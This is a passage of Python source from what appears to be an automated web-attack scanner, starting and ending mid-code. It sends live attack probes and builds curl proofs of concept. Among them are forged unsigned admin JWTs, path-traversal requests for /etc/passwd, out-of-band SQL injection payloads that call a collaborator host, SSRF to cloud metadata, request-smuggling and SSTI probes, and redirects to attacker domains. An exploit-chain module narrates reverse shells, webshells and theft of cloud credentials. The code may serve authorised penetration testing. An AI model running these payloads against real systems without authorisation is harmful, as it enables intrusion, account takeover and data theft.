        {"url_qs": "a=1%26role=admin", "body": None, "label": "encoded-amp"},
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/") + "/api/v1"
        for test in self.FRAGMENTATION_TESTS:
            url = base + "?" + test["url_qs"]
            body_data = test["body"].encode() if test["body"] else None
            headers = {"Content-Type": "application/x-www-form-urlencoded"} if body_data else {}
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, "POST" if body_data else "GET",
                           body_data, headers)
                baseline = _fetch(base + "?id=1", cfg.ua, cfg.timeout)
                if not r or not baseline:
                    continue
                if r.status == 200 and r.status != baseline.status:
                    profile.findings.append(Finding(
                        id=f"PARAM-FRAG-{test['label'].upper()[:15]}",
                        title=f"Parameter fragmentation bypass ({test['label']}) alters response",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-235",
                        description=(
                            f"Fragmented parameter test '{test['label']}' returned {r.status} "
                            f"vs baseline {baseline.status}. WAF may inspect parameters individually "
                            "while backend merges them."
                        ),
                        poc_curl=f"curl -sk '{url}'" + (f" -d '{test['body']}'" if test["body"] else ""),
                        category="Injection",
                        remediation="Normalise and deduplicate parameters server-side before any validation. Apply WAF rules after full parameter parsing."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 145: Scope-Escaped JWT (aud) Bypass (SKILL-155) ──────
class JWTAudienceBypass:
    """Test JWT audience (aud) claim bypass via none, wildcard, and claim confusion."""
    NAME = "JWT Audience Bypass"
    import base64 as _b64_mod
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import base64 as _b
        API_PATHS = ["/api/me", "/api/user", "/api/admin",
                     "/api/internal", "/api/v1/me"]
        FORGED_TOKENS = []
        for aud in ["*", "any", "https://api.example.com",
                    profile.host, f"https://{profile.host}"]:
            hdr = _b.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            pay = _b.urlsafe_b64encode(
                json.dumps({
                    "sub": "admin", "role": "admin",
                    "aud": aud, "iss": f"https://{profile.host}",
                    "exp": 9999999999
                }).encode()
            ).rstrip(b"=").decode()
            FORGED_TOKENS.append((f"{hdr}.{pay}.", aud))
        for path in API_PATHS[:3]:
            url = profile.url.rstrip("/") + path
            for token, aud in FORGED_TOKENS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout,
                               headers_extra={"Authorization": f"Bearer {token}"})
                    if r and r.status not in (401, 403):
                        profile.findings.append(Finding(
                            id="JWT-AUD-BYPASS",
                            title=f"JWT aud='{aud}' forged token accepted at {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-347",
                            description=(
                                f"Unsigned JWT (alg=none) with aud='{aud}' returned "
                                f"HTTP {r.status} at {path}. Server not validating audience or signature."
                            ),
                            poc_curl=(
                                f"curl -sk {url} "
                                f"-H 'Authorization: Bearer {token}'"
                            ),
                            category="Authentication",
                            remediation="Validate aud claim strictly against expected audience. Reject alg=none. Use a JWT library that enforces audience verification."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 146: Reverse Proxy Path Confusion (SKILL-156) ────────
class ReverseProxyPathConfusion:
    """Detect path confusion between front-end proxy and back-end via URL encoding."""
    NAME = "Reverse Proxy Path Confusion"
    CONFUSION_PATHS = [
        "/api/..%2fadmin",
        "/api/%2e%2e%2fadmin",
        "/api/v1/..%2f..%2fadmin",
        "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/api/users/..%2fadmin%2fusers",
        "/;/admin",
        "/.;/admin",
        "/api/./admin",
        "//admin//",
        "/api/%252fadmin",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        try:
            baseline = _fetch(profile.url.rstrip("/") + "/admin",
                              cfg.ua, cfg.timeout)
            baseline_status = baseline.status if baseline else 403
        except Exception:
            baseline_status = 403
        for path in self.CONFUSION_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                if r.status != baseline_status and r.status not in (400, 404):
                    body = (r.body or b"").decode("utf-8", errors="replace")[:100]
                    profile.findings.append(Finding(
                        id=f"PROXY-PATH-CONF-{path.replace('/','_')[:15].upper()}",
                        title=f"Reverse proxy path confusion: {path} → HTTP {r.status}",
                        severity="HIGH",
                        cvss=8.3,
                        cwe="CWE-22",
                        description=(
                            f"Path '{path}' returned {r.status} while /admin returns {baseline_status}. "
                            "Front-end proxy may normalise paths differently than back-end, "
                            "bypassing ACL rules. Response: {body}"
                        ),
                        poc_curl=f"curl -sk --path-as-is '{url}'",
                        category="Access Control",
                        remediation="Normalise URL paths at the proxy layer before ACL checks. Use --merge-slashes, decode %2f, and resolve .. before routing."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 147: OOB SQL Injection via DNS (SKILL-157) ───────────
class OOBSQLiDNS:
    """Generate DNS-based out-of-band SQL injection payloads for blind SQLi confirmation."""
    NAME = "OOB SQLi DNS"
    OOB_PAYLOADS = {
        "MySQL":    "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.COLLAB\\\\a'))-- -",
        "MSSQL":    "'; EXEC master..xp_dirtree '\\\\COLLAB\\a'-- -",
        "Oracle":   "' AND (SELECT UTL_HTTP.REQUEST('http://COLLAB/'||user) FROM DUAL)-- -",
        "PostgreSQL": "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB'-- -",
    }
    PARAMS = ["id", "user", "username", "search", "q", "category",
              "order", "sort", "filter", "email", "name"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        poc_lines = []
        for db, pl in self.OOB_PAYLOADS.items():
            for param in self.PARAMS[:3]:
                url = profile.url.rstrip("/") + f"/api?{param}={pl.replace('COLLAB', 'YOUR_COLLABORATOR')}"
                poc_lines.append(f"# {db}:\ncurl -sk '{url}'")
        profile.findings.append(Finding(
            id="SQLI-OOB-DNS",
            title="OOB SQL injection DNS payloads generated (MySQL/MSSQL/Oracle/PostgreSQL)",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-89",
            description=(
                "DNS-based out-of-band SQLi payloads generated for all four major databases. "
                "Replace YOUR_COLLABORATOR with Burp Collaborator or interactsh host. "
                "DNS callbacks confirm blind SQLi when error/boolean methods are blocked."
            ),
            poc_curl="\n".join(poc_lines[:6]),
            category="Injection",
            remediation="Use parameterised queries. Restrict DB user privileges to prevent file/network operations. Block outbound DNS from DB servers."
        ))
        # Also attempt error-based detection to see if any params reflect SQL errors
        SQL_ERR = re.compile(
            r'(?:SQL syntax|mysql_fetch|ORA-\d{5}|PG::|'
            r'SQLite|near ".*": syntax|unclosed quotation)', re.I)
        for param in self.PARAMS[:5]:
            url = profile.url.rstrip("/") + f"/api?{param}='"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.body:
                    body = r.body.decode("utf-8", errors="replace")
                    m = SQL_ERR.search(body)
                    if m:
                        profile.findings.append(Finding(
                            id="SQLI-OOB-ERROR-DETECT",
                            title=f"SQL error keyword in response — OOB SQLi confirmed surface: {param}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-89",
                            description=f"SQL error '{m.group(0)[:60]}' in response for {param}='. Proceed with OOB payloads above.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Parameterise all queries immediately. Suppress database error messages in responses."
                        ))
                        return profile
            except Exception:
                pass
        return profile

# ── Tool 148: Auth Bypass via Duplicate Parameters (SKILL-158)─
class AuthBypassDuplicateParams:
    """Test auth bypass via duplicate auth-related parameters in query string."""
    NAME = "Auth Bypass Duplicate Params"
    BYPASS_TESTS = [
        "?admin=false&admin=true",
        "?role=user&role=admin",
        "?authenticated=false&authenticated=1",
        "?user_id=2&user_id=1",
        "?token=invalid&token=",
        "?scope=read&scope=admin%3Awrite",
        "?access=denied&access=granted",
    ]
    SENSITIVE_PATHS = ["/admin", "/api/admin", "/api/v1/admin",
                       "/dashboard", "/api/settings", "/api/users"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SENSITIVE_PATHS[:4]:
            base_url = profile.url.rstrip("/") + path
            try:
                baseline = _fetch(base_url, cfg.ua, cfg.timeout)
                if not baseline or baseline.status not in (401, 403):
                    continue
            except Exception:
                continue
            for qs in self.BYPASS_TESTS:
                url = base_url + qs
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status not in (401, 403, 404):
                        profile.findings.append(Finding(
                            id="AUTH-DUPE-PARAM",
                            title=f"Auth bypass via duplicate parameter: {qs[:40]}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-288",
                            description=(
                                f"Path {path} normally returns {baseline.status}. "
                                f"With duplicate params '{qs}' returned {r.status}. "
                                "Server uses last/first parameter value inconsistently with WAF."
                            ),
                            poc_curl=f"curl -sk '{url}'",
                            category="Access Control",
                            remediation="Reject requests with duplicate security-sensitive parameters. Unambiguously define first-vs-last param semantics and apply WAF rules after deduplication."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 149: Insecure Mobile Deep Link (SKILL-159) ───────────
class InsecureMobileDeepLink:
    """Detect mobile deep-link scheme handling endpoints vulnerable to parameter injection."""
    NAME = "Insecure Mobile Deep Link"
    DEEP_LINK_PATHS = [
        "/open", "/redirect", "/deep-link", "/deeplink",
        "/app/open", "/app/redirect", "/mobile/open",
        "/api/deeplink", "/api/open-app",
    ]
    SCHEMES = ["myapp://", "intent://", "exp://", "fb://", "twitter://"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.DEEP_LINK_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status not in (200, 302, 400, 422):
                    continue
                loc = r.headers.get("location", "")
                body = (r.body or b"").decode("utf-8", errors="replace")
                if any(s in (loc + body).lower() for s in self.SCHEMES):
                    profile.findings.append(Finding(
                        id=f"DEEPLINK-EXPOSED-{path.replace('/','_')[:12].upper()}",
                        title=f"Mobile deep-link redirect endpoint: {path}",
                        severity="MEDIUM",
                        cvss=6.1,
                        cwe="CWE-601",
                        description=(
                            f"Deep-link endpoint {url} responded {r.status} with scheme redirect. "
                            f"Location/body: {(loc or body[:60])}. "
                            "Test for open redirect to arbitrary schemes and parameter injection."
                        ),
                        poc_curl=(
                            f"curl -sk -v '{url}?url=evil%3A%2F%2Fattacker.com' 2>&1 | grep -i location\n"
                            f"curl -sk '{url}?target=javascript:alert(1)'"
                        ),
                        category="Open Redirect",
                        remediation="Validate deep-link targets against a scheme+host allowlist. Never pass user-controlled values directly to deep-link redirects."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 150: Advanced Exploit Chain Synthesiser (SKILL-160) ──
class AdvancedExploitChain:
    """Synthesise multi-step exploit chains with attack narrative and CVSS impact."""
    NAME = "Advanced Exploit Chain Synthesiser"
    # Chained attack patterns: trigger categories → chain description → narrative
    CHAIN_PATTERNS = [
        ({"SSRF", "Cloud"},
         "SSRF → Cloud Metadata → IAM Key Exfiltration → Full AWS Takeover",
         "CRITICAL", 10.0,
         "1. SSRF fetches http://169.254.169.254/  2. IAM role credentials returned  "
         "3. aws configure + enumerate S3/EC2/Lambda  4. Lateral movement to production infra"),
        ({"XSS", "CORS"},
         "Stored XSS + CORS Misconfiguration → Account Takeover via Cookie Exfiltration",
         "CRITICAL", 9.8,
         "1. Inject XSS into stored field  2. Victim visits profile page  "
         "3. XHR to /api/me with CORS wildcard leaks session  4. Replay session to /api/tokens"),
        ({"JWT", "CORS"},
         "JWT Algorithm Confusion + CORS → Admin Account Takeover",
         "CRITICAL", 9.8,
         "1. Forge RS256→HS256 JWT with admin role  2. CORS wildcard allows cross-origin read  "
         "3. Combine to exfiltrate admin data and escalate"),
        ({"SSTI", "RCE"},
         "SSTI Expression Evaluation → OS Command Execution → Server Takeover",
         "CRITICAL", 10.0,
         "1. Inject {{7*7}} → 49  2. Escalate to Jinja2 class traversal payload  "
         "3. os.popen('id')  4. Reverse shell"),
        ({"Deserialization"},
         "Insecure Deserialization → Gadget Chain → RCE",
         "CRITICAL", 10.0,
         "1. Identify Java/PHP/.NET deserialization endpoint  "
         "2. Generate gadget chain with ysoserial/phpggc  "
         "3. Submit base64 payload  4. Command execution"),
        ({"IDOR", "Access Control"},
         "IDOR + Broken Access Control → Mass User Data Exfiltration",
         "HIGH", 8.8,
         "1. Enumerate user IDs via IDOR  2. BAC allows reading other users' data  "
         "3. Automate to scrape full user database"),
        ({"LFI"},
         "LFI → Log Poisoning → PHP RCE → Webshell Persistence",
         "CRITICAL", 10.0,
         "1. LFI reads /var/log/apache2/access.log  "
         "2. Send PHP code in User-Agent  3. LFI executes poisoned log  "
         "4. Upload webshell via system() call"),
        ({"Cache"},
         "Cache Poisoning → Stored XSS Delivery to All Users",
         "HIGH", 8.8,
         "1. Inject XSS payload via unkeyed header  2. Response cached by CDN  "
         "3. All subsequent visitors receive poisoned response  4. Mass session theft"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        if not profile.findings:
            return profile
        all_cats = set()
        all_ids  = set()
        for f in profile.findings:
            all_cats.add(f.category)
            all_ids.add(f.id)
        # also tokenise words from finding titles/ids
        all_tokens = set()
        for f in profile.findings:
            all_tokens.update(f.id.split("-"))
            all_tokens.update(f.category.split())
        all_tokens = {t.upper() for t in all_tokens}
        triggered = []
        for req_cats, chain_title, sev, cvss, narrative in self.CHAIN_PATTERNS:
            if any(cat.upper() in all_tokens or
                   any(cat.lower() in c.lower() for c in all_cats)
                   for cat in req_cats):
                triggered.append((chain_title, sev, cvss, narrative))
        if not triggered:
            return profile
        chain_text = "\n\n".join(
            f"[{sev}] {title}\n  Narrative: {narr}"
            for title, sev, cvss, narr in triggered[:5])
        top = sorted(profile.findings,
                     key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
                     .get(f.severity, 5))[:5]
        poc = "\n".join(f"Step {i+1}: {f.poc_curl[:100]}" for i, f in enumerate(top))
        profile.findings.append(Finding(
            id="ADV-EXPLOIT-CHAIN",
            title=f"Advanced exploit chain: {triggered[0][0][:70]}",
            severity=triggered[0][1],
            cvss=triggered[0][2],
            cwe="CWE-1035",
            description=(
                f"Attack chains synthesised for {profile.host} "
                f"({len(triggered)} chains, {len(profile.findings)} findings):\n\n"
                + chain_text
            ),
            poc_curl=poc,
            category="Exploit Chain",
            remediation="Remediate CRITICAL findings first — especially any chain anchor (SSRF, SSTI, Deserialisation, LFI). Each individual fix breaks the chain."
        ))
        return profile

# ── Tool 151: GraphQL Subscription SSRF (SKILL-161) ──────────
class GraphQLSubscriptionSSRF:
    """Test GraphQL subscription endpoints for SSRF via pubsub URL parameters."""
    NAME = "GraphQL Subscription SSRF"
    SUB_PATHS = ["/graphql", "/api/graphql", "/subscriptions",
                 "/api/subscriptions", "/ws/graphql"]
    SUB_QUERIES = [
        '{"type":"connection_init"}',
        '{"type":"start","id":"1","payload":{"query":"subscription{messageAdded{id}}"}}',
        '{"query":"subscription{__typename}"}',
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        ssrf_url = "http://169.254.169.254/latest/meta-data/"
        for ep in self.SUB_PATHS:
            url = profile.url.rstrip("/") + ep
            # Test subscription init with SSRF callback URL
            ssrf_payload = json.dumps({
                "type": "connection_init",
                "payload": {"url": ssrf_url, "callbackUrl": ssrf_url,
                            "endpoint": ssrf_url, "webhook": ssrf_url}
            })
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                           ssrf_payload.encode(),
                           {"Content-Type": "application/json"})
                if r and r.body:
                    body = r.body.decode("utf-8", errors="replace")
                    if any(k in body for k in ["ami-id", "instance-id",
                                               "connection_ack", "ka"]):
                        profile.findings.append(Finding(
                            id="GQL-SUB-SSRF",
                            title=f"GraphQL subscription endpoint — SSRF via connection URL: {ep}",
                            severity="HIGH",
                            cvss=8.6,
                            cwe="CWE-918",
                            description=(
                                f"GraphQL subscription endpoint {ep} accepted connection_init "
                                "with SSRF URLs in payload fields. If server fetches the "
                                "callback URL, SSRF to internal services is possible."
                            ),
                            poc_curl=(
                                f"curl -sk -X POST {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{ssrf_payload}'"
                            ),
                            category="SSRF",
                            remediation="Validate all subscription callback/endpoint URLs. Block RFC1918. Use a dedicated SSRF-safe fetcher for pubsub."
                        ))
                        return profile
            except Exception:
                pass
        return profile

# ── Tool 152: Insecure Redirect after Login (SKILL-162) ───────
class PostLoginOpenRedirect:
    """Test open redirect in post-login next/return URL to steal OAuth codes."""
    NAME = "Post-Login Open Redirect"
    LOGIN_PATHS = ["/login", "/auth/login", "/api/login",
                   "/signin", "/auth/signin", "/account/login"]
    REDIRECT_PARAMS = ["next", "return", "returnUrl", "redirect",
                       "redirect_uri", "continue", "dest", "to",
                       "successUrl", "after_login"]
    EVIL_URLS = [
        "//evil.example.com/%2f..",
        "https://evil.example.com/",
        "/\\/evil.example.com/",
        "https:evil.example.com",
        "javascript:alert(1)",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.LOGIN_PATHS[:4]:
            for param in self.REDIRECT_PARAMS[:5]:
                for evil in self.EVIL_URLS[:3]:
                    url = profile.url.rstrip("/") + path + f"?{param}={evil}"
                    try:
                        r = _fetch(url, cfg.ua, cfg.timeout)
                        if not r:
                            continue
                        loc = r.headers.get("location", "")
                        if r.status in (301, 302, 303, 307, 308) and (
                                "evil.example.com" in loc or
                                loc.startswith("//evil") or
                                "javascript:" in loc.lower()):
                            profile.findings.append(Finding(
                                id="POST-LOGIN-REDIRECT",
                                title=f"Open redirect after login via '{param}' on {path}",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-601",
                                description=(
                                    f"Login endpoint {path}?{param}={evil} "
                                    f"redirected to '{loc[:80]}'. "
                                    "After authentication the user is sent to attacker-controlled URL. "
                                    "Useful for OAuth code theft and session token leakage."
                                ),
                                poc_curl=(
                                    f"curl -sk -v '{url}' -d 'username=victim&password=x' "
                                    f"2>&1 | grep location"
                                ),
                                category="Open Redirect",
                                remediation="Validate post-login redirect against a same-origin allowlist. Reject external URLs. Use relative paths only."
                            ))
                            return profile
                    except Exception:
                        pass
        return profile

# ── Tool 153: HTTP Verb Tunnelling WAF Bypass (SKILL-163) ─────
class HTTPVerbTunnelling:
    """Bypass WAF verb restrictions by tunnelling DELETE/PUT inside POST."""
    NAME = "HTTP Verb Tunnelling"
    TUNNEL_HEADERS = {
        "X-HTTP-Method-Override": "DELETE",
        "X-HTTP-Method": "DELETE",
        "X-Method-Override": "DELETE",
    }
    FORM_FIELD = "_method=DELETE"
    TARGETS = ["/api/users/1", "/api/admin/users/1",
               "/api/accounts/1", "/api/sessions/1", "/api/tokens/1"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.TARGETS[:4]:
            url = profile.url.rstrip("/") + path
            for hdr, val in self.TUNNEL_HEADERS.items():
                for method in ("DELETE",):
                    try:
                        r_direct = _fetch(url, cfg.ua, cfg.timeout, method)
                        r_tunnel = _fetch(url, cfg.ua, cfg.timeout, "POST",
                                          self.FORM_FIELD.encode(),
                                          {"Content-Type": "application/x-www-form-urlencoded",
                                           hdr: val})
                        if not r_direct or not r_tunnel:
                            continue
                        if r_direct.status in (405, 403) and r_tunnel.status not in (405, 403, 404):
                            profile.findings.append(Finding(
                                id=f"VERB-TUNNEL-{hdr.upper()[:15]}",
                                title=f"HTTP verb tunnelling bypasses WAF: POST+{hdr} acts as DELETE on {path}",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-650",
                                description=(
                                    f"Direct {method} to {path} returned {r_direct.status}. "
                                    f"Tunnelled via POST+{hdr}:{val} returned {r_tunnel.status}. "
                                    "WAF/proxy honours method override, bypassing method-level ACL."
                                ),
                                poc_curl=(
                                    f"curl -sk -X POST {url} "
                                    f"-H '{hdr}: {val}' "
                                    f"-d '{self.FORM_FIELD}'"
                                ),
                                category="Access Control",
                                remediation="Strip method-override headers at the WAF/proxy. Never allow method override on destructive endpoints."
                            ))
                    except Exception:
                        pass
        return profile

# ── Tool 154: API Schema Disclosure via OPTIONS (SKILL-164) ───
class APISchemaOptionsLeak:
    """Detect schema/WADL/WSDL disclosure via OPTIONS method and Allow header."""
    NAME = "API Schema OPTIONS Leak"
    SCHEMA_PATHS = ["/api", "/api/v1", "/api/v2", "/rest",
                    "/api/schema", "/api/swagger", "/api/docs"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SCHEMA_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, "OPTIONS")
                if not r:
                    continue
                allow = r.headers.get("allow", "")
                body  = (r.body or b"").decode("utf-8", errors="replace")
                has_schema = any(k in body.lower() for k in
                                 ["swagger", "openapi", "wadl", "wsdl",
                                  "paths", "definitions", "components"])
                dangerous_methods = [m for m in ["PUT","DELETE","PATCH","TRACE"]
                                     if m in allow.upper()]
                if has_schema or dangerous_methods:
                    profile.findings.append(Finding(
                        id=f"OPTIONS-SCHEMA-{path.replace('/','_')[:12].upper()}",
                        title=f"API OPTIONS discloses schema/methods at {path}",
                        severity="MEDIUM" if not has_schema else "HIGH",
                        cvss=5.3,
                        cwe="CWE-200",
                        description=(
                            f"OPTIONS {path} → Allow: {allow}. "
                            + (f"Schema keywords in body. " if has_schema else "")
                            + (f"Dangerous methods advertised: {dangerous_methods}" if dangerous_methods else "")
                        ),
                        poc_curl=f"curl -sk -X OPTIONS {url} -v 2>&1 | grep -iE 'allow|swagger|openapi'",
                        category="Information Disclosure",
                        remediation="Restrict OPTIONS responses to allowed methods only. Remove schema from OPTIONS body. Require auth for schema endpoints."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 155: Request Smuggling via Content-Length (SKILL-165)─
class CLRequestSmuggling:
    """Send obfuscated Content-Length smuggling probes to detect parser inconsistencies."""
    NAME = "CL Request Smuggling"
    PROBES = [
        # Obfuscated TE with space
        {
            "headers": {
                "Transfer-Encoding": " chunked",
                "Content-Length": "5",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": b"0\r\n\r\n",
            "label": "TE-space-obfuscation",
        },
        # Tab in TE header value
        {
            "headers": {
                "Transfer-Encoding": "\tchunked",
                "Content-Length": "5",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": b"0\r\n\r\n",
            "label": "TE-tab-obfuscation",
        },
        # Duplicate CL with different values
        {
            "headers": {
                "Content-Length": "6",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": b"x=1\r\n\r\n",
            "label": "CL-mismatch",
        },
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for probe in self.PROBES:
            try:
                r = _fetch(profile.url, cfg.ua, 8, "POST",
                           probe["body"], probe["headers"])
                if r and r.status == 200:
                    profile.findings.append(Finding(
                        id=f"CL-SMUGGLE-{probe['label'].upper()[:15]}",
                        title=f"Request smuggling probe accepted ({probe['label']})",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-444",
                        description=(
                            f"Probe '{probe['label']}' with obfuscated Transfer-Encoding "
                            "returned HTTP 200. Front-end/back-end header parsing inconsistency "
                            "may allow request smuggling."
                        ),
                        poc_curl=(
                            f"curl -sk -X POST {profile.url} "
                            + " ".join(f"-H '{k}: {v}'" for k,v in probe["headers"].items())
                            + f" --data-binary $'0\\r\\n\\r\\n'"
                        ),
                        category="HTTP Smuggling",
                        remediation="Normalise Transfer-Encoding at the proxy. Reject requests with both CL and TE. Upgrade to HTTP/2 end-to-end."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 156: IDOR via Hashed IDs (SKILL-166) ─────────────────
class IDORHashedID:
    """Detect IDOR where object IDs are MD5/SHA1 hashes of predictable values."""
    NAME = "IDOR Hashed ID"
    import hashlib as _hl
    HASH_PAT = re.compile(
        r'(?:"id"|"user_id"|"object_id"|"ref")\s*:\s*"([0-9a-f]{32}|[0-9a-f]{40})"',
        re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import hashlib
        api_paths = ["/api/me", "/api/user", "/api/profile", "/api/account"]
        for path in api_paths:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for m in self.HASH_PAT.finditer(body):
                    h = m.group(1)
                    h_len = len(h)
                    # Try reversing: hash of sequential integers 1-10000
                    algo = "md5" if h_len == 32 else "sha1"
                    preimages = []
                    for i in range(1, 200):
                        digest = getattr(hashlib, algo)(str(i).encode()).hexdigest()
                        if digest == h.lower():
                            preimages.append(str(i))
                            break
                        digest2 = getattr(hashlib, algo)(f"user_{i}".encode()).hexdigest()
                        if digest2 == h.lower():
                            preimages.append(f"user_{i}")
                            break
                    if preimages:
                        profile.findings.append(Finding(
                            id="IDOR-HASHED-ID",
                            title=f"IDOR — hashed ID reversed: {algo}({preimages[0]}) = {h[:16]}...",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-639",
                            description=(
                                f"Object ID '{h}' is {algo.upper()}({preimages[0]}). "
                                "All sequential IDs can be enumerated by hashing integers. "
                                "Attacker can access arbitrary objects without guessing GUIDs."
                            ),
                            poc_curl=(
                                f"# Generate hashed IDs:\n"
                                f"for i in $(seq 1 1000); do "
                                f"echo -n $i | {algo}sum; done | grep KNOWN_HASH\n"
                                f"curl -sk {profile.url}{path}/HASHED_ID"
                            ),
                            category="Access Control",
                            remediation="Use UUID v4 or random tokens as object identifiers. Never use MD5/SHA1 of sequential integers as IDs."
                        ))
                        return profile
                    elif h_len in (32, 40):
                        profile.findings.append(Finding(
                            id="IDOR-HASHED-SURFACE",
                            title=f"{algo.upper()}-like ID in API response — test IDOR via hash enumeration",
                            severity="MEDIUM",
                            cvss=5.4,
                            cwe="CWE-639",
                            description=f"Possible {algo.upper()} hash ID '{h[:16]}...' found at {path}. If derived from sequential values, enumerable.",
                            poc_curl=f"curl -sk {url} | python3 -m json.tool | grep id",
                            category="Access Control",
                            remediation="Use cryptographically random UUIDs. Avoid deterministic hashes as external identifiers."
                        ))
            except Exception:
                pass
        return profile

# ── Tool 157: Blind SSTI via Email Template (SKILL-167) ───────
class BlindSSTIEmail:
    """Detect blind SSTI in email fields where templates are rendered server-side."""
    NAME = "Blind SSTI Email Template"
    SSTI_MARKERS = [
        ("{{7777*7777}}", "49284729"),   # Jinja2 / Twig
        ("${7777*7777}", "49284729"),    # FreeMarker / Velocity
        ("#{7777*7777}", "49284729"),    # EL / Thymeleaf
        ("<%= 7777*7777 %>", "49284729"),# ERB
        ("[[${7777*7777}]]", "49284729"), # Thymeleaf inline
    ]
    EMAIL_PATHS = ["/api/contact", "/api/newsletter", "/api/subscribe",
                   "/api/forgot-password", "/api/invite",
                   "/contact", "/subscribe", "/newsletter"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.EMAIL_PATHS[:5]:
            url = profile.url.rstrip("/") + path
            for pl, expected in self.SSTI_MARKERS[:3]:
                body_data = json.dumps({
                    "email": f"test+{pl}@example.com",
                    "name": pl,
                    "subject": pl,
                    "message": pl,
                }).encode()
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", body_data,
                               {"Content-Type": "application/json"})
                    if not r:
                        continue
                    resp = (r.body or b"").decode("utf-8", errors="replace")
                    if expected in resp or (r.status == 200 and pl not in resp):
                        profile.findings.append(Finding(
                            id="BLIND-SSTI-EMAIL",
                            title=f"Blind SSTI in email template field via {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-94",
                            description=(
                                f"SSTI payload '{pl}' submitted to {path}. "
                                + (f"Expected output '{expected}' found in response." if expected in resp
                                   else "Payload not reflected — template may be rendered asynchronously (check email content).")
                            ),
                            poc_curl=(
                                f"curl -sk -X POST {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"email\":\"attacker@example.com\",\"name\":\"{pl}\"}}'"
                            ),
                            category="RCE",
                            remediation="Use sandboxed template rendering. Escape all user inputs before passing to template engines. Use email template libraries that forbid expression evaluation."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 158: OIDC / OpenID Misconfiguration (SKILL-168) ──────
class OIDCMisconfigScanner:
    """Detect OIDC misconfiguration: nonce absence, token reuse, prompt bypass."""
    NAME = "OIDC Misconfig Scanner"
    OIDC_PATHS = ["/.well-known/openid-configuration",
                  "/.well-known/oauth-authorization-server",
                  "/oauth2/.well-known/openid-configuration",
                  "/auth/.well-known/openid-configuration"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.OIDC_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200 or not r.body:
                    continue
                try:
                    config = json.loads(r.body.decode("utf-8", errors="replace"))
                except Exception:
                    continue
                issues = []
                # Implicit flow enabled
                rt = config.get("response_types_supported", [])
                if "token" in rt or "id_token token" in rt:
                    issues.append("implicit flow (response_type=token) enabled")
                # Weak signing algorithms
                algs = config.get("id_token_signing_alg_values_supported", [])
                if "none" in algs or "RS1" in str(algs):
                    issues.append(f"weak signing alg: {algs}")
                # No PKCE support listed
                pkce = config.get("code_challenge_methods_supported", [])
                if not pkce:
                    issues.append("PKCE not advertised")
                elif "plain" in pkce:
                    issues.append("PKCE plain method supported (downgrade risk)")
                # Subject types
                sub = config.get("subject_types_supported", [])
                if "public" in sub:
                    issues.append("public subject_type (correlatable user IDs)")
                issuer = config.get("issuer", "?")
                if issues:
                    profile.findings.append(Finding(
